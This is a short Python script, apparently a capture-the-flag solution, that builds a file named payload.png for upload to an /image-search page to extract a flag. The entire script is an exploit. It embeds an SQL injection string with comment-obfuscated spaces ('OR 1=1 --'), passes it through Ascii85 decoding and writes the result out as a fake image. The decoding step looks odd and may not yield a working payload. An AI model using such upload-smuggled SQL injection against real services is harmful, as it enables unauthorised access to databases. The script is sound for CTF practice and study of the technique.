#!/usr/bin/env python3

# Use this script to generate a file called payload.png
# This file can be uploaded on the page /image-search to reveal the flag

import base64

e = b''
e += b"/**/\\\\\\\\\\\\'/**/OR/**/1=1/**/--/**//"
d = base64.a85decode(e)

with open('payload.png', 'wb') as out:
    out.write(d)

